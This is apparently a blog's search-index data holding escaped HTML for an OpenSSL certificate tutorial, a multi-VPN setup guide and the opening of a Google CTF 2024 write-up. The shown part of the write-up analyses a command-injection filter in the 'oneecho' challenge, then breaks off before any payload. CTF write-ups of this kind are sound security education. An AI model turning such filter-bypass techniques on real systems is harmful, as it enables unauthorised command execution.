src=\"https://i.imgur.com/9QVNtr8.png\" alt=\"\"\u003e\n\u003cimg src=\"https://i.imgur.com/WU3MpFU.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch3 id=\"revoke-certificate\"\u003eRevoke certificate\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl ca -revoke \u0026lt;certificate file\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e執行結果\n\u003cimg src=\"https://i.imgur.com/MRVWR1n.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch3 id=\"generate-crl\"\u003eGenerate CRL\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl ca -gencrl -out \u0026lt;crl file\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Everytime you revoke your certificate, you need to regenerate your CRL.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e執行結果\n\u003cimg src=\"https://i.imgur.com/uBK8LCz.png\" alt=\"\"\u003e\n\u003cimg src=\"https://i.imgur.com/TXyTUaM.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch2 id=\"certificate-的信任-trust-of-certificate\"\u003ecertificate 的信任 (trust of certificate)\u003c/h2\u003e\n\u003ch3 id=\"untrusted-certificate-root-ca-untrusted\"\u003eUntrusted Certificate (Root CA untrusted)\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://i.imgur.com/ng4xLgR.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch3 id=\"trusted-certificate-root-ca-trusted\"\u003eTrusted Certificate (Root CA trusted)\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://i.imgur.com/6H04mJB.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch3 id=\"how-to-trust-root-ca-in-windows\"\u003eHow to trust Root CA in windows\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cimg src=\"https://i.imgur.com/MZoNzDe.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003cli\u003e\u003cimg src=\"https://i.imgur.com/HRJpxQf.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003cli\u003e\u003cimg src=\"https://i.imgur.com/NVTc4FW.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003cli\u003e\u003cimg src=\"https://i.imgur.com/1L19EBL.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003cli\u003e\u003cimg src=\"https://i.imgur.com/DSEt9SO.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003cli\u003e\u003cimg src=\"https://i.imgur.com/17jz2or.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003cli\u003e\u003cimg src=\"https://i.imgur.com/Ltm8V6p.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003cli\u003eReopen Root CA certificate file. \u003cimg src=\"https://i.imgur.com/wufNBsO.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"how-to-trust-root-ca-in-linux\"\u003eHow to trust Root CA in linux\u003c/h3\u003e\n\u003ch4 id=\"for-openssl\"\u003eFor openssl\u003c/h4\u003e\n\u003cp\u003eCopy CA certificate to /usr/local/share/ca-certificates/ and run update-ca-certificates\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecp \u0026lt;Root CA certificate\u0026gt; /usr/local/share/ca-certificates/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eupdate-ca-certificates\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# flush all ca use: update-ca-certificates -f\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://i.imgur.com/5f87Zyh.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch4 id=\"for-linux-browser\"\u003eFor linux browser\u003c/h4\u003e\n\u003cp\u003eGo to setting of browser. Ex: Firefox\n\u003cimg src=\"https://i.imgur.com/R0Fjtm1.png\" alt=\"\"\u003e\n\u003cimg src=\"https://i.imgur.com/IBKroQi.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch2 id=\"nginx-ssl-setting\"\u003eNginx ssl setting\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://i.imgur.com/CEIe0RM.png\" alt=\"\"\u003e\nWindows\n\u003cimg src=\"https://i.imgur.com/0KYmqkN.png\" alt=\"\"\u003e\nLinux\n\u003cimg src=\"https://i.imgur.com/6ebDXMN.png\" alt=\"\"\u003e\u003c/p\u003e\n","description":"","image":"","permalink":"https://blog.chummydns.com/blogs/openssl_usage/","title":"OpenSSL 簽憑證教學"},{"content":"\u003ch2 id=\"ipsec\"\u003eIPsec\u003c/h2\u003e\n\u003ch3 id=\"install-strongswan\"\u003eInstall strongswan\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapt install strongswan strongswan-pki libcharon-extra-plugins libcharon-extauth-plugins libstrongswan-extra-plugins\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"config-file\"\u003eConfig file\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e/etc/ipsec.conf\n\u003cul\u003e\n\u003cli\u003efor connect config\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e/etc/ipsec.secrets\n\u003cul\u003e\n\u003cli\u003eA config to save your password, preshare key, private key\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e/etc/ipsec.d/\n\u003cul\u003e\n\u003cli\u003eThe directorys where the certificates or private keys is placed.\n\u003cul\u003e\n\u003cli\u003e/etc/ipsec.d/cacerts/\n\u003cul\u003e\n\u003cli\u003efor CA certificate\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e/etc/ipsec.d/certs/\n\u003cul\u003e\n\u003cli\u003efor certificate\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e/etc/ipsec.d/private/\n\u003cul\u003e\n\u003cli\u003efor private key\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eCertificate for IPsec must have \u003cstrong\u003eEKU\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eIP security IKE intermediate (oid is 1.3.6.1.5.5.8.2.2)\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"simple-config-of-ipsecconf\"\u003eSimple config of ipsec.conf\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003econn \u0026lt;connect name\u0026gt;\n        # Auto mean do you want to actively initiate a connection or passively accept a connection?\n        auto=\u0026lt;add | start\u0026gt;\t\n        type=\u0026lt;tunnel | transport\u0026gt;\n        keyexchange=\u0026lt;ike | ikev1 | ikev2\u0026gt;\n\n        #left mean local\n        left=\u0026lt;left ip addres default is %any\u0026gt;\n        leftauth=\u0026lt;server auth method\u0026gt;\n        leftsubnet=\u0026lt;what subnet that client can forward whan client connect to vpn\u0026gt;\n\n        #right mean remote\n        right=\u0026lt;right ip addres default is %any\u0026gt;\n        rightauth=\u0026lt;client auth method\u0026gt;\n        rightsourceip=\u0026lt;if you use tunnel mode. What subnet do you want to assign to client\u0026gt;\n\n        # etc.\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"simple-config-of-ipsecsecrets\"\u003eSimple config of ipsec.secrets\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# for public auth\n: RSA \u0026#34;\u0026lt;private key file name\u0026gt;\u0026#34;\n\n# for password auth\n\u0026lt;username\u0026gt; : EAP \u0026#34;\u0026lt;password\u0026gt;\u0026#34;\n\n# for preshare key auth\n\u0026lt;remote ip\u0026gt; : PSK \u0026#34;\u0026lt;preshare key\u0026gt;\u0026#34; \n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"wireguard\"\u003eWireguard\u003c/h2\u003e\n\u003ch3 id=\"setup-by-commandlinux\"\u003eSetup by command(Linux)\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eAdd interface\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eip link add dev wg0 type wireguard\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eSetup ip\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eip address add dev wg0 192.168.2.1/24\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eip address add dev wg0 192.168.2.1 peer 192.168.2.2\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eSetup wg configurations\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ewg setconf wg0 myconfig.conf\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewg set wg0 listen-port 51820 private-key /path/to/private-key peer ABCDEF... allowed-ips 192.168.88.0/24 endpoint 209.202.254.14:8172\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eStart interface\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eip link set up dev wg0\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"setup-by-configuration\"\u003eSetup by configuration\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eConfiguration file\n\u003cul\u003e\n\u003cli\u003e/etc/wireguard/wg0.conf\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eStart interface\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003esystemctl enable wg-quick@wg0\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewg-quick up wg0\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"example-connfigurations---client\"\u003eExample connfigurations - Client\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://i.imgur.com/5fzLxqW.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch4 id=\"example-connfigurations---server\"\u003eExample connfigurations - Server\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://i.imgur.com/1NujUxH.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch3 id=\"interface\"\u003eInterface\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eAddress (optional)\n\u003cul\u003e\n\u003cli\u003eIP address and netmask of the interface\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eListenPort\n\u003cul\u003e\n\u003cli\u003eWg service listen port\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003ePrivateKey\n\u003cul\u003e\n\u003cli\u003ePrivate key of the interface\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003ePreUp / PreDown / PostUp / PostDown\n\u003cul\u003e\n\u003cli\u003eRun shell scripts before / after interface up / down\u003c/li\u003e\n\u003cli\u003eE.g.\n\u003cul\u003e\n\u003cli\u003eSetup firewall rules\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"peer\"\u003ePeer\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePublicKey\n\u003cul\u003e\n\u003cli\u003ePublic key of the peer\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eAllowedIPs\n\u003cul\u003e\n\u003cli\u003eIP addresses that are allowed to pass through this peer\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eEndpoint (Optional)\n\u003cul\u003e\n\u003cli\u003eLocation of the peer\u003c/li\u003e\n\u003cli\u003eWg will also use the previous connections to detect this configuration\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003ePersistentKeepalive (Optional)\n\u003cul\u003e\n\u003cli\u003eBy default, Wg send packs only if there are data to be send\u003c/li\u003e\n\u003cli\u003eSend packs to peer periodically to bypass NAT or Firewall\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003ePresharedKey (Optional)\n\u003cul\u003e\n\u003cli\u003ePre-shared key for additional symmetric encryption\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"generate-key-pair\"\u003eGenerate Key Pair\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eKey pair\n\u003cul\u003e\n\u003cli\u003ewg genkey \u0026gt; privatekey\u003c/li\u003e\n\u003cli\u003ewg pubkey \u0026lt; privatekey \u0026gt; publickey\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003ePre-shared key\n\u003cul\u003e\n\u003cli\u003ewg genpsk \u0026gt; preshared\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"openvpn\"\u003eOpenVPN\u003c/h2\u003e\n\u003ch3 id=\"configuration\"\u003eConfiguration\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eTemplate directory\n\u003cul\u003e\n\u003cli\u003eYou can choose your config Template in this directory\u003c/li\u003e\n\u003cli\u003e/usr/share/doc/openvpn/examples/sample-config-files/\u003c/li\u003e\n\u003cli\u003e\u003cimg src=\"https://i.imgur.com/fkheOLQ.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eWrite your config file in /etc/openvpn/\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"simple-server-config\"\u003eSimple server config\u003c/h3\u003e\n\u003cp\u003eYour server certificate need \u003cstrong\u003eEKU\u003c/strong\u003e: \u003cem\u003e\u003cstrong\u003eserver authentication\u003c/strong\u003e\u003c/em\u003e\n\u003cimg src=\"https://i.imgur.com/ESCembk.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch3 id=\"simple-client-config\"\u003eSimple client config\u003c/h3\u003e\n\u003cp\u003eYour client certificate need \u003cstrong\u003eEKU\u003c/strong\u003e: \u003cem\u003e\u003cstrong\u003eclient authentication\u003c/strong\u003e\u003c/em\u003e\n\u003cimg src=\"https://i.imgur.com/PPViaX9.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eYou can put your CA, certificate and private in the config with \u003ccode\u003e\u0026lt;ca\u0026gt;\u0026lt;/ca\u0026gt; \u0026lt;cert\u0026gt;\u0026lt;/cert\u0026gt; \u0026lt;key\u0026gt;\u0026lt;/key\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eBut don’t use it with \u003ccode\u003eca, cert, key\u003c/code\u003e attributes in the same time.\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eca \u0026lt;CA certificate path\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecert \u0026lt;certificate path\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ekey \u0026lt;private key path\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"https://i.imgur.com/n865ryu.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch3 id=\"enable-and-start\"\u003eEnable and Start\u003c/h3\u003e\n\u003ch4 id=\"start-your-openvpn-server-or-client\"\u003eStart your openvpn server or client\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl start openvpn@\u0026lt;vpn config name without .conf\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"start-at-boot\"\u003eStart at boot\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl enable openvpn@\u0026lt;vpn config name without .conf\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"user-authentication\"\u003eUser-authentication\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eSimply by signing client certs.\u003c/li\u003e\n\u003cli\u003eUse Username/password\u003c/li\u003e\n\u003cli\u003eUse 3rd party authentication\n\u003cul\u003e\n\u003cli\u003eRADIUS\u003c/li\u003e\n\u003cli\u003eLDAP\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 id=\"server-side\"\u003eServer side\u003c/h4\u003e\n\u003ch5 id=\"pam-authentication\"\u003ePAM authentication\u003c/h5\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-ovpn\" data-lang=\"ovpn\"\u003eplugin /usr/lib/openvpn/plugins/openvpn-plugin-auth-pam.so login\n\u003c/code\u003e\u003c/pre\u003e\u003ch5 id=\"use-a-shell-script-to-auth\"\u003eUse a shell script to auth\u003c/h5\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-ovpn\" data-lang=\"ovpn\"\u003eauth-user-pass-verify \u0026lt;script path\u0026gt; via-env\nscript-security 3 # To allow script reading passwords\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 id=\"client-side\"\u003eClient side\u003c/h4\u003e\n\u003ch5 id=\"auth\"\u003eAuth\u003c/h5\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-ovpn\" data-lang=\"ovpn\"\u003eauth-user-pass\n\u003c/code\u003e\u003c/pre\u003e\u003ch5 id=\"auth-with-specify-user\"\u003eAuth with specify user\u003c/h5\u003e\n\u003ch6 id=\"in-config\"\u003ein config\u003c/h6\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-ovpn\" data-lang=\"ovpn\"\u003eauth-user-pass \u0026lt;user file\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch6 id=\"in-user-file\"\u003ein \u003ccode\u003e\u0026lt;user file\u0026gt;\u003c/code\u003e\u003c/h6\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e\u0026lt;Username\u0026gt;\n\u0026lt;Password\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e","description":"","image":"","permalink":"https://blog.chummydns.com/blogs/simple-vpn-generate/","title":"各常見 VPN 架設簡易教學"},{"content":"\u003ch1 id=\"google-ctf-2024-writeup\"\u003eGoogle CTF 2024 WriteUp\u003c/h1\u003e\n\u003ch2 id=\"戰績\"\u003e戰績\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/102ab7a2-a951-47de-9dfa-5732cb2cc83a\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/225aff8b-6771-4163-8635-fe91b0cbc17e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch2 id=\"oneecho\"\u003eoneecho\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/d55e3843-2a4a-4b99-8fea-b46791dbec0d\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"概述\"\u003e概述\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003enc\u003c/code\u003e 進去是一個可以讓你下指令的 shell\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/c11bebbe-800a-47c0-a3aa-72e693661878\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e然而只能下 \u003ccode\u003eecho\u003c/code\u003e 不能下其他的，目測要 command injection\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4a39314d-020c-4a20-a70c-edb727830d2e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e到 \u003ccode\u003echallenge.js\u003c/code\u003e 來看看他怎檔的。\u003c/p\u003e\n\u003cp\u003e首先他 require 了 \u003ccode\u003ebash-parser\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eparse\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erequire\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;bash-parser\u0026#39;\u003c/span\u003e); \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e接著他把指令 parse 成 ast\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eparse\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ecmd\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ecall \u003ccode\u003echeck\u003c/code\u003e 做檢查\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003echeck\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e)) (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003erl\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ewrite\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Hacker detected! No hacks, only echo!\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003erl\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eclose\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e來看看他怎麼檢查的。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003echeck\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003etypeof\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e===\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;string\u0026#39;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eprop\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ein\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eprop\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e===\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;type\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003eprop\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e===\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Redirect\u0026#39;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eprop\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e===\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;type\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003east\u003c/span\u003e[\u003cspan 